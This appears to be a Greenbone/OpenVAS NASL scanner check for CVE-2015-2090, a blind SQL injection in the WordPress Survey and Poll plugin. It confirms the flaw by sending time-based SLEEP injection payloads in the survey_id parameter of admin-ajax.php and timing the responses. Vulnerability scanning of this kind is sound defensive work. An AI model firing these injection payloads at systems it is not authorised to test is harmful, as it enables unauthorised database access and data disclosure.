CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805141" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2015-03-05 10:54:55 +0530 (Thu, 05 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "WordPress Survey and Poll Blind SQL Injection Vulnerability" );
	script_cve_id( "CVE-2015-2090" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  Survey and Poll plugin and is prone to blind sql injection vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not." );
	script_tag( name: "insight", value: "Flaw is due to the settings.php script
  not properly sanitizing user-supplied input to the 'survey_id' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "WordPress Survey and Poll Plugin
  version 1.1, Prior versions may also be affected." );
	script_tag( name: "solution", value: "Update to version 1.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36054" );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/wp-survey-and-poll/changelog" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
time_taken = 0;
actual_time = 0;
func get_responce_time( url, http_port ){
	sndReq = http_get( item: url, port: http_port );
	start = unixtime();
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	stop = unixtime();
	time_taken = stop - start;
	return ( time_taken );
}
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/wp-survey-and-poll/wordpress-survey-and-poll.php";
sndReq = http_get( item: url, port: http_port );
start = unixtime();
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
stop = unixtime();
if(rcvRes && IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" )){
	actual_time = stop - start;
	url = dir + "/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save" + "&survey_id=1%20AND%20SLEEP%280%29--";
	time_taken_1 = get_responce_time( url: url, http_port: http_port );
	if(time_taken_1 > actual_time + 5){
		exit( 0 );
	}
	url = dir + "/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save" + "&survey_id=1%20AND%20SLEEP%285%29--";
	time_taken_2 = get_responce_time( url: url, http_port: http_port );
	if(time_taken_2 < actual_time + 5){
		exit( 0 );
	}
	url = dir + "/wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save" + "&survey_id=1%20AND%20SLEEP%280%29--";
	time_taken_3 = get_responce_time( url: url, http_port: http_port );
	if(time_taken_3 > actual_time + 5){
		exit( 0 );
	}
	security_message( port: http_port );
	exit( 0 );
}

